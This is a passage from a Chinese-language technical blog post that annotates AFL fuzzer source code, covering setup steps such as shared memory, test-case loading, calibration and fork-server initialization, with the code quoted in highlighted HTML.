class="line">    <span class="keyword">if</span> (!hang_tmout) <span class="built_in">FATAL</span>(<span class="string">&quot;Invalid value of AFL_HANG_TMOUT&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode == <span class="number">2</span> &amp;&amp; no_forkserver)</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;AFL_DUMB_FORKSRV and AFL_NO_FORKSRV are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>, <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PRELOAD&quot;</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;DYLD_INSERT_LIBRARIES&quot;</span>, <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PRELOAD&quot;</span>), <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_LD_PRELOAD&quot;</span>))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Use AFL_PRELOAD instead of AFL_LD_PRELOAD&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>如果我们想要给程序添加 <code>LD_PRELOAD</code>，正确方式是设置 <code>AFL_PRELOAD</code> 环境变量</p>
<h3 id="cmdline-banner-checktty"><a href="#cmdline-banner-checktty" class="headerlink" title="cmdline&#x2F;banner&#x2F;checktty"></a>cmdline&#x2F;banner&#x2F;checktty</h3><p>保存命令行参数到一个buffer里</p>
<p>banner：AFL图形化界面</p>
<p>tty</p>
<ul>
<li>如果<code>AFL_NO_UI</code>环境变量存在，则设置<code>not_on_tty = 1</code></li>
<li>ioctl获取<code>TIOCGWINSZ</code>，如果报错则表示当前不在tty上运行，设置<code>not_on_tty = 1</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">save_cmdline</span>(argc, argv);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fix_up_banner</span>(argv[optind]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">check_if_tty</span>();</span><br></pre></td></tr></table></figure>

<h3 id="bind-cpu-core"><a href="#bind-cpu-core" class="headerlink" title="bind cpu core"></a>bind cpu core</h3><p>绑定一个CPU核心，fuzzer 检查系统的负载，把自己绑定到一个空闲 cpu 核心上。另外，若 cpu 频率可调，则建议用户将其定在最高频率。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">get_core_count</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_AFFINITY</span></span><br><span class="line">  <span class="built_in">bind_to_free_cpu</span>();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* HAVE_AFFINITY */</span></span></span><br><span class="line">  <span class="comment">// 确保核心转储不会进入程序 也就是 core pattern 设置</span></span><br><span class="line">  <span class="built_in">check_crash_handling</span>();</span><br><span class="line">  <span class="comment">// 检查CPU调节器</span></span><br><span class="line">  <span class="built_in">check_cpu_governor</span>();</span><br></pre></td></tr></table></figure>

<h3 id="setup-post"><a href="#setup-post" class="headerlink" title="setup post"></a>setup post</h3><p>若有环境变量 <code>AFL_POST_LIBRARY</code> ，则调用 <code>dlopen</code> 挂载这个 lib，将全局变量 <code>post_handler</code> 指向 lib 中的 <code>afl_postprocess</code>函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="comment">// AFL_POST_LIBRARY</span></span><br><span class="line">  <span class="built_in">setup_post</span>();</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">setup_post</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* dh;</span><br><span class="line">  u8* fn = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_POST_LIBRARY&quot;</span>);</span><br><span class="line">  u32 tlen = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!fn) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ACTF</span>(<span class="string">&quot;Loading postprocessor from &#x27;%s&#x27;...&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">  dh = <span class="built_in">dlopen</span>(fn, RTLD_NOW);</span><br><span class="line">  <span class="keyword">if</span> (!dh) <span class="built_in">FATAL</span>(<span class="string">&quot;%s&quot;</span>, <span class="built_in">dlerror</span>());</span><br><span class="line"></span><br><span class="line">  post_handler = <span class="built_in">dlsym</span>(dh, <span class="string">&quot;afl_postprocess&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!post_handler) <span class="built_in">FATAL</span>(<span class="string">&quot;Symbol &#x27;afl_postprocess&#x27; not found.&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Do a quick test. It&#x27;s better to segfault now than later =) */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">post_handler</span>(<span class="string">&quot;hello&quot;</span>, &amp;tlen);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">OKF</span>(<span class="string">&quot;Postprocessor installed successfully.&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 fuzzer 变异出一个新的用例、即将交给目标程序执行时，这个函数会被调用。所以，假如用户想要对 AFL 变异出的用例进行操作——例如将其记录到数据库中——就可以通过不修改 AFL 源码的方式实现。用户只需写一个 <code>post_handler</code>，编译成动态链接库，通过 <code>AFL_POST_LIBRARY</code> 告知 AFL。</p>
<h3 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup shm"></a>setup shm</h3><p>shm: AFL根据二元tuple（跳转的源地址和目标地址）来记录分支信息，从而获取target的执行流程和代码覆盖情况。起始阶段 <code>fuzzer</code> 会进行一系列的准备工作，为记录插桩得到的目标程序执行路径，即 <code>tuple</code> 信息。</p>
<ul>
<li><code>trace_bits</code> 指向共享内存的指针，用于进程间通信 </li>
<li><code>virgin_bits</code> 用来记录总的tuple信息；  </li>
<li><code>virgin_tmout</code> 记录fuzz过程中出现的所有目标程序的timeout时的tuple信息；  </li>
<li><code>virgin_crash</code> 记录fuzz过程中出现的crash时的tuple信息；</li>
</ul>
<p>这里直接创建一个共享内存，同子进程forkserver中 <code>__afl_global_area</code> 指向的区域进行共享</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Configure shared memory and virgin_bits. This is called at startup. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">setup_shm</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8* shm_str;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_bitmap) <span class="built_in">memset</span>(virgin_bits, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(virgin_tmout, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">  <span class="built_in">memset</span>(virgin_crash, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  shm_id = <span class="built_in">shmget</span>(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;shmget() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// atexit 为程序退出时注册的函数，会在exit前执行</span></span><br><span class="line">  <span class="built_in">atexit</span>(remove_shm);</span><br><span class="line"></span><br><span class="line">  shm_str = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%d&quot;</span>, shm_id);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If somebody is asking us to fuzz instrumented binaries in dumb mode,</span></span><br><span class="line"><span class="comment">     we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending</span></span><br><span class="line"><span class="comment">     fork server commands. This should be replaced with better auto-detection</span></span><br><span class="line"><span class="comment">     later on, perhaps? */</span></span><br><span class="line">  <span class="comment">// 环境变量</span></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode) <span class="built_in">setenv</span>(SHM_ENV_VAR, shm_str, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ck_free</span>(shm_str);</span><br><span class="line"></span><br><span class="line">  trace_bits = <span class="built_in">shmat</span>(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (trace_bits == (<span class="type">void</span> *)<span class="number">-1</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;shmat() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>trace_bits</code>用一个字节来记录是否到达这个路径，和这个路径被命中了多少次的，而这个次数在0-255之间，但比如一个循环，它循环5次和循环6次可能是完全一样的效果，为了避免被当成不同的路径，或者说尽可能减少因为命中次数导致的区别。</p>
<p>在每次去计算是否发现了新路径之前，先把这个路径命中数进行规整，比如把命中5次和6次都统一认为是命中了8次，一字节宽的变量按如下映射。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ？ 数组还能这样初始化</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> u8 count_class_lookup8[<span class="number">256</span>] = &#123;</span><br><span class="line">      [<span class="number">0</span>]           = <span class="number">0</span>, <span class="comment">// 00000000</span></span><br><span class="line">      [<span class="number">1</span>]           = <span class="number">1</span>, <span class="comment">// 00000001</span></span><br><span class="line">      [<span class="number">2</span>]           = <span class="number">2</span>, <span class="comment">// 00000010</span></span><br><span class="line">      [<span class="number">3</span>]           = <span class="number">4</span>, <span class="comment">// 00000100</span></span><br><span class="line">      [<span class="number">4</span> ... <span class="number">7</span>]     = <span class="number">8</span>, <span class="comment">// 00001000</span></span><br><span class="line">      [<span class="number">8</span> ... <span class="number">15</span>]    = <span class="number">16</span>,<span class="comment">// 00010000</span></span><br><span class="line">      [<span class="number">16</span> ... <span class="number">31</span>]   = <span class="number">32</span>,<span class="comment">// 00100000</span></span><br><span class="line">      [<span class="number">32</span> ... <span class="number">127</span>]  = <span class="number">64</span>,<span class="comment">// 01000000</span></span><br><span class="line">      [<span class="number">128</span> ... <span class="number">255</span>] = <span class="number">128</span><span class="comment">// 10000000</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>命中率统计</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">init_count_class16</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 b1, b2;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (b1 = <span class="number">0</span>; b1 &lt; <span class="number">256</span>; b1++) </span><br><span class="line">    <span class="keyword">for</span> (b2 = <span class="number">0</span>; b2 &lt; <span class="number">256</span>; b2++)</span><br><span class="line">      count_class_lookup16[(b1 &lt;&lt; <span class="number">8</span>) + b2] = </span><br><span class="line">        (count_class_lookup8[b1] &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">        count_class_lookup8[b2];</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="setup-dirs"><a href="#setup-dirs" class="headerlink" title="setup dirs"></a>setup dirs</h3><p>创建输出的目录，存在几个目录</p>
<ul>
<li>queue：输入队列</li>
<li>crashes: 记录着所有的crash输入</li>
<li>hangs：同上，记录所有的hang输入</li>
</ul>
<h3 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read testcases"></a>read testcases</h3><p>把初始语料集读进 queue 里</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Read all testcases from the input directory, then queue them for testing.</span></span><br><span class="line"><span class="comment">   Called at startup. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">read_testcases</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">dirent</span> **nl;</span><br><span class="line">  s32 nl_cnt;</span><br><span class="line">  u32 i;</span><br><span class="line">  u8* fn;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Auto-detect non-in-place resumption attempts. */</span></span><br><span class="line"></span><br><span class="line">  fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/queue&quot;</span>, in_dir);</span><br><span class="line">  <span class="comment">// 首先判断是否存在in_dir/queue</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">access</span>(fn, F_OK)) in_dir = fn; <span class="keyword">else</span> <span class="built_in">ck_free</span>(fn);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ACTF</span>(<span class="string">&quot;Scanning &#x27;%s&#x27;...&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We use scandir() + alphasort() rather than readdir() because otherwise,</span></span><br><span class="line"><span class="comment">     the ordering  of test cases would vary somewhat randomly and would be</span></span><br><span class="line"><span class="comment">     difficult to control. */</span></span><br><span class="line">  <span class="comment">// 不使用readdir是因为测试用例的顺序将随机变化，难以控制。读取后的文件将按字母排序。</span></span><br><span class="line">  nl_cnt = <span class="built_in">scandir</span>(in_dir, &amp;nl, <span class="literal">NULL</span>, alphasort);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nl_cnt &lt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (errno == ENOENT || errno == ENOTDIR)</span><br><span class="line"></span><br><span class="line">      <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;The input directory does not seem to be valid - try again. The fuzzer needs\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    one or more test case to start with - ideally, a small file under 1 kB\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    or so. The cases must be stored as regular files directly in the input\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    directory.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shuffle_queue &amp;&amp; nl_cnt &gt; <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ACTF</span>(<span class="string">&quot;Shuffling queue...&quot;</span>);</span><br><span class="line">    <span class="built_in">shuffle_ptrs</span>((<span class="type">void</span>**)nl, nl_cnt);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 测试用例是否在in_dir/.state/deterministic_done/文件夹中存在</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nl_cnt; i++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">stat</span> st;</span><br><span class="line"></span><br><span class="line">    u8* fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line">    u8* dfn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.state/deterministic_done/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line"></span><br><span class="line">    u8  passed_det = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(nl[i]); <span class="comment">/* not tracked */</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">lstat</span>(fn, &amp;st) || <span class="built_in">access</span>(fn, R_OK))</span><br><span class="line">      <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to access &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This also takes care of . and .. */</span></span><br><span class="line">	</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">S_ISREG</span>(st.st_mode) || !st.st_size || <span class="built_in">strstr</span>(fn, <span class="string">&quot;/README.testcases&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">ck_free</span>(fn);</span><br><span class="line">      <span class="built_in">ck_free</span>(dfn);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (st.st_size &gt; MAX_FILE) </span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Test case &#x27;%s&#x27; is too big (%s, limit is %s)&quot;</span>, fn,</span><br><span class="line">            <span class="built_in">DMS</span>(st.st_size), <span class="built_in">DMS</span>(MAX_FILE));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for metadata that indicates that deterministic fuzzing</span></span><br><span class="line"><span class="comment">       is complete for this entry. We don&#x27;t want to repeat deterministic</span></span><br><span class="line"><span class="comment">       fuzzing when resuming aborted scans, because it would be pointless</span></span><br><span class="line"><span class="comment">       and probably very time-consuming. */</span></span><br><span class="line">	<span class="comment">// 如果存在则判定该测试用例已完成确定性变异，过滤该input</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">access</span>(dfn, F_OK)) passed_det = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">ck_free</span>(dfn);</span><br><span class="line">    <span class="comment">// 如果存在则判定该测试用例已完成确定性变异，过滤该input</span></span><br><span class="line">	<span class="comment">// 如果不存在这加入队列</span></span><br><span class="line">    <span class="built_in">add_to_queue</span>(fn, st.st_size, passed_det);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(nl); <span class="comment">/* not tracked */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!queued_paths) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">         <span class="string">&quot;Looks like there are no valid test cases in the input directory! The fuzzer\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    needs one or more test case to start with - ideally, a small file under\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    1 kB or so. The cases must be stored as regular files directly in the\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    input directory.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;No usable test cases in &#x27;%s&#x27;&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  last_path_time = <span class="number">0</span>;</span><br><span class="line">  queued_at_start = queued_paths;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><p>读入自动生成的字典token，从<code>in_dir/auto_extras/auto_%06u</code>处依次读取，调用<code>maybe_add_auto</code>按规则加入字典</p>
<h3 id="pivot-inputs"><a href="#pivot-inputs" class="headerlink" title="pivot_inputs"></a>pivot_inputs</h3><p>把初始 corpus 复制到工作目录的 queue 文件夹下 </p>
<p>在输出目录中为输入测试用例创建硬链接，其中的<code>mark_as_det_done</code>将一些经过确定性变异的文件放入<code>deterministic_done</code>目录，之后就不会再重复测试。</p>
<h3 id="load-extras"><a href="#load-extras" class="headerlink" title="load_extras"></a>load_extras</h3><p>如果用户通过 -x 选项指定了 dictionary，则从那里导入 extra，加载用户自己设定的字典token，从extras_dir读取extras到extras数组里，并按size排序。</p>
<h3 id="detect-file-args"><a href="#detect-file-args" class="headerlink" title="detect_file_args"></a>detect_file_args</h3><p>参数是否存在 <code>@@</code>，如果有则替换<code>argv[i] = cwd/out_dir/.cur_input</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Detect @@ in args. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">detect_file_args</span><span class="params">(<span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 i = <span class="number">0</span>;</span><br><span class="line">  u8* cwd = <span class="built_in">getcwd</span>(<span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!cwd) <span class="built_in">PFATAL</span>(<span class="string">&quot;getcwd() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (argv[i]) &#123;</span><br><span class="line"></span><br><span class="line">    u8* aa_loc = <span class="built_in">strstr</span>(argv[i], <span class="string">&quot;@@&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (aa_loc) &#123;</span><br><span class="line"></span><br><span class="line">      u8 *aa_subst, *n_arg;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If we don&#x27;t have a file name chosen yet, use a safe default. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!out_file)</span><br><span class="line">        out_file = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.cur_input&quot;</span>, out_dir);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Be sure that we&#x27;re always using fully-qualified paths. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (out_file[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span>) aa_subst = out_file;</span><br><span class="line">      <span class="keyword">else</span> aa_subst = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s&quot;</span>, cwd, out_file);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Construct a replacement argv value. */</span></span><br><span class="line"></span><br><span class="line">      *aa_loc = <span class="number">0</span>;</span><br><span class="line">      n_arg = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s%s%s&quot;</span>, argv[i], aa_subst, aa_loc + <span class="number">2</span>);</span><br><span class="line">      argv[i] = n_arg;</span><br><span class="line">      *aa_loc = <span class="string">&#x27;@&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (out_file[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>) <span class="built_in">ck_free</span>(aa_subst);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    i++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(cwd); <span class="comment">/* not tracked */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="setup-stdio-check-binary"><a href="#setup-stdio-check-binary" class="headerlink" title="setup stdio -&gt; check binary"></a>setup stdio -&gt; check binary</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建 .cur_input 文件并打开，设为 out_fd。接下来 fuzzer 要把变异出的 input 写进这里，由 child 读取</span></span><br><span class="line"><span class="keyword">if</span> (!out_file) <span class="built_in">setup_stdio_file</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查目标程序，看找不找得到、在不在 /tmp 等。</span></span><br><span class="line"><span class="comment">// 不能为shell脚本，同时检查elf文件头是否合法及程序是否被插桩。</span></span><br><span class="line"><span class="built_in">check_binary</span>(argv[optind]);</span><br></pre></td></tr></table></figure>

<h2 id="perform-dry-run"><a href="#perform-dry-run" class="headerlink" title="perform_dry_run"></a>perform_dry_run</h2><p>用 queue 中的所有用例跑一遍程序；另外，它使用了 fork server。在代码中，这种 dry run 称为「calibrate（校准）」。</p>
<ul>
<li>依次读取queue中的内容</li>
<li>调用 <code>calibrate_case</code> 函数校准该测试用例，得到返回值<code>res</code>，</li>
<li>根据<code>res</code>判断错误类型</li>
</ul>
<h3 id="calibrate-case"><a href="#calibrate-case" class="headerlink" title="calibrate_case"></a>calibrate_case</h3><p>校准：用例会被运行多次</p>
<ul>
<li>FAULT_NONE：该测试用例不产生crash</li>
<li>FAULT_TMOUT：该测试用例产生超时错误。当<code>timeout_given</code>为2时跳过该文件</li>
<li>FAULT_CRASH ：初始测试用例就引发了崩溃，需要排除mem_limit的问题</li>
<li>FAULT_ERROR：目标程序无法执行</li>
<li>FAULT_NOINST：没检测到插桩代码，直接退出</li>
<li>FAULT_NOBITS：无用测试用例。该用例有路径信息但没新路径</li>
</ul>
<p><code>calibrate_case</code> 函数的运行时机至少有两个：一是程序运行之初，用于校准初始 corpus；二是发现了新路径，将有趣的用例加入 queue 时。总结一句：<strong>进了 queue 的用例，都要被运行一遍<code>calibrate_case</code> 函数</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> u8 <span class="title">calibrate_case</span><span class="params">(<span class="type">char</span>** argv, <span class="keyword">struct</span> queue_entry* q, u8* use_mem,</span></span></span><br><span class="line"><span class="params"><span class="function">                         u32 handicap, u8 from_queue)</span></span></span><br></pre></td></tr></table></figure>

<p>校准过程是多次运行用例（默认是 8 次），统计各次运行的结果。</p>
<ul>
<li>若 fork server 没有准备好，就<strong>调用 <code>init_forkserver()</code> 初始化 fork server</strong></li>
<li><strong>多次调用 <code>run_target()</code> 运行目标程序</strong>，观察结果。若没有任何 hit count 命中，则认为程序未插桩，报告错误。</li>
<li>如果发现对某用例多次运行程序，其表现不一致，则将执行次数提升到 40 次，并更新 <code>var_bytes[]</code> （这个全局变量表示 shm 中哪些位置存在不一致性）。另外，将 queue entry 的 <code>var_behavior</code> 标记设为 <code>1</code>。</li>
<li>更新 queue entry 信息，例如将 <code>exec_us</code> 字段设为校准过程中的执行时间均值。</li>
<li><strong>给这个用例打分，并更新 <code>top_rated</code> 指针数组。</strong></li>
</ul>
<h3 id="init-forkserver"><a href="#init-forkserver" class="headerlink" title="init forkserver"></a>init forkserver</h3><p>fuzzer 初始化 forkserver</p>
<ol>
<li>fork出一个子进程用于执行目标程序，也就是将来的fork server</li>
<li>重定向文件描述符<ul>
<li>文件描述符1和2重定向至dev_null_fd</li>
<li>如果指定了out_file则重定向文件描述符0至out_fd，如果没有执行则重定向至dev_null_fd</li>
</ul>
</li>
<li>将控制管道和状态管道重定向至FORKSRV_FD和FORKSRV_FD+1，然后关闭用不到的管道</li>
<li>调用execv，进程替换，子进程执行目标程序作为forkserver，IPC进程间通信</li>
<li>等待forkserver启动，从状态管道中读取到4字节的数据，判定forkserver启动完毕</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Spin up fork server (instrumented mode only). The idea is explained here:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   http://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   In essence, the instrumentation allows us to skip execve(), and just keep</span></span><br><span class="line"><span class="comment">   cloning a stopped child. So, we just execute once, and then send commands</span></span><br><span class="line"><span class="comment">   through a pipe. The other part of this logic is in afl-as.h. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">init_forkserver</span><span class="params">(<span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">itimerval</span> it;</span><br><span class="line">  <span class="comment">// status pipe</span></span><br><span class="line">  <span class="comment">// control pipe</span></span><br><span class="line">  <span class="type">int</span> st_pipe[<span class="number">2</span>], ctl_pipe[<span class="number">2</span>];</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  s32 rlen;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ACTF</span>(<span class="string">&quot;Spinning up the fork server...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">pipe</span>(st_pipe) || <span class="built_in">pipe</span>(ctl_pipe)) <span class="built_in">PFATAL</span>(<span class="string">&quot;pipe() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  forksrv_pid = fork();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (forksrv_pid &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;fork() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 子进程</span></span><br><span class="line">  <span class="keyword">if</span> (!forksrv_pid) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">rlimit</span> r;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Umpf. On OpenBSD, the default fd limit for root users is set to</span></span><br><span class="line"><span class="comment">       soft 128. Let&#x27;s try to fix that... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">getrlimit</span>(RLIMIT_NOFILE, &amp;r) &amp;&amp; r.rlim_cur &lt; FORKSRV_FD + <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">      r.rlim_cur = FORKSRV_FD + <span class="number">2</span>;</span><br><span class="line">      <span class="built_in">setrlimit</span>(RLIMIT_NOFILE, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mem_limit) &#123;</span><br><span 